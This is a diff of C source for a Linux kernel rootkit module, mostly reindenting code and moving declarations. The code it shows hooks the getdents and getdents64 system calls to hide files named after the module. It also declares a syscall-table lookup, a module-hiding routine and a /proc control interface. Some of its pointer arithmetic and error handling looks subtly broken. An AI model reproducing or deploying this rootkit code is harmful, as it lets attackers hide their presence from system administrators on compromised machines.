@@ -1,29 +1,10 @@
 #include "ker_mod.h"
 
-static struct proc_dir_entry *proc_rtkit;
-static struct proc_dir_entry *proc_root;
-
-static char module_hidden = 0;
-static struct list_head *module_previous;
-static struct list_head *module_kobj_previous;
-
-static int temp;
-static char desc[50];
-
-// unsigned long *syscall_table = NULL;
-unsigned long* syscall_table;
-//typedef asmlinkage long (*original_stuff) (const char *, int, mode_t);
-//original_stuff original_write;
-asmlinkage long (*original_write)(unsigned int,
-                                  const char __user *,
-                                  size_t);
-asmlinkage long (*original_getdents64)(unsigned int,
-                                struct linux_dirent64 __user *,
-                                unsigned int);
-
-asmlinkage long (*original_getdents)(unsigned int,
-                                struct linux_dirent __user *,
-                                unsigned int);
+static const struct file_operations rootkit_fops = {
+		.owner = THIS_MODULE,
+		.read = rtkit_read,
+		.write = rtkit_write,
+};
 
 asmlinkage long custom_write(unsigned int i, const char __user *u, size_t s)
 {
@@ -39,64 +20,64 @@ asmlinkage long custom_write(unsigned int i, const char __user *u, size_t s)
  */
  asmlinkage long custom_getdents64(unsigned int fd, struct linux_dirent64 __user *dirp, unsigned int count)
  {
-     unsigned int tmp, i;
-     struct linux_dirent64 __user *new_dir;
+         unsigned int tmp, i;
+         struct linux_dirent64 __user *new_dir;
 
-     tmp = (*original_getdents64)(fd, dirp, count);
-     i = 0;
-     new_dir = dirp;
-     while (i < tmp) {
-         int reclen, len;
-         char* next_rec;
-         char* remaining_dirents;
-         if(strncmp(new_dir->d_name, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
-             reclen = new_dir->d_reclen;
-             next_rec = (char *)new_dir + reclen;
-             len = (int *)dirp + tmp - (int *)next_rec;
-             remaining_dirents = kmalloc(len, GFP_KERNEL);
-             if(copy_from_user(remaining_dirents, next_rec, len))
-                 continue;
-             if(copy_to_user(new_dir, remaining_dirents, len))
-                 continue;
-             kfree(remaining_dirents);
-             tmp -= reclen;
-             continue;
+         tmp = (*original_getdents64)(fd, dirp, count);
+         i = 0;
+         new_dir = dirp;
+         while (i < tmp) {
+                 int reclen, len;
+                 char* next_rec;
+                 char* remaining_dirents;
+                 if(strncmp(new_dir->d_name, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
+                         reclen = new_dir->d_reclen;
+                         next_rec = (char *)new_dir + reclen;
+                         len = (int *)dirp + tmp - (int *)next_rec;
+                         remaining_dirents = kmalloc(len, GFP_KERNEL);
+                         if(copy_from_user(remaining_dirents, next_rec, len))
+                             continue;
+                         if(copy_to_user(new_dir, remaining_dirents, len))
+                             continue;
+                         kfree(remaining_dirents);
+                         tmp -= reclen;
+                         continue;
+                 }
+                 i += new_dir->d_reclen;
+                 new_dir = (struct linux_dirent64*)((char *)dirp + i);
          }
-         i += new_dir->d_reclen;
-         new_dir = (struct linux_dirent64*)((char *)dirp + i);
-     }
-     return tmp;
+         return tmp;
  }
 
  asmlinkage long custom_getdents(unsigned int fd, struct linux_dirent __user *dirp, unsigned int count)
  {
-     unsigned int tmp, i;
-     struct linux_dirent __user *new_dir;
+         unsigned int tmp, i;
+         struct linux_dirent __user *new_dir;
 
-     tmp = (*original_getdents)(fd, dirp, count);
-     i = 0;
-     new_dir = dirp;
-     while (i < tmp) {
-         int reclen, len;
-         char* next_rec;
-         char* remaining_dirents;
-         if(strncmp(new_dir->d_name, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
-             reclen = new_dir->d_reclen;
-             next_rec = (char *)new_dir + reclen;
-             len = (int *)dirp + tmp - (int *)next_rec;
-             remaining_dirents = kmalloc(len, GFP_KERNEL);
-             if(copy_from_user(remaining_dirents, next_rec, len))
-                 continue;
-             if(copy_to_user(new_dir, remaining_dirents, len))
-                 continue;
-             kfree(remaining_dirents);
-             tmp -= reclen;
-             continue;
+         tmp = (*original_getdents)(fd, dirp, count);
+         i = 0;
+         new_dir = dirp;
+         while (i < tmp) {
+                 int reclen, len;
+                 char* next_rec;
+                 char* remaining_dirents;
+                 if(strncmp(new_dir->d_name, MODULE_NAME, strlen(MODULE_NAME)) == 0) {
+                         reclen = new_dir->d_reclen;
+                         next_rec = (char *)new_dir + reclen;
+                         len = (int *)dirp + tmp - (int *)next_rec;
+                         remaining_dirents = kmalloc(len, GFP_KERNEL);
+                         if(copy_from_user(remaining_dirents, next_rec, len))
+                             continue;
+                         if(copy_to_user(new_dir, remaining_dirents, len))
+                             continue;
+                         kfree(remaining_dirents);
+                         tmp -= reclen;
+                         continue;
+                 }
+                 i += new_dir->d_reclen;
+                 new_dir = (struct linux_dirent*)((char *)dirp + i);
          }
-         i += new_dir->d_reclen;
-         new_dir = (struct linux_dirent*)((char *)dirp + i);
-     }
-     return tmp;
+         return tmp;
  }
 
 void module_hide(void)
@@ -129,7 +110,7 @@ static ssize_t rtkit_read(struct file *file, char __user *buffer,
 		temp -= count;
 
 		if(!copy_to_user(buffer, desc, count))
-      return -1;
+        return -1;
 
 		if(count == 0) {
 				sprintf(desc, "test\n");
@@ -149,12 +130,6 @@ static ssize_t rtkit_write(struct file *file, const char __user *buffer,
 		}
 		return count;
 }
-
-static const struct file_operations rootkit_fops = {
-		.owner = THIS_MODULE,
-		.read = rtkit_read,
-		.write = rtkit_write,
-};
 
 static unsigned long **get_syscall_table(void)
 {
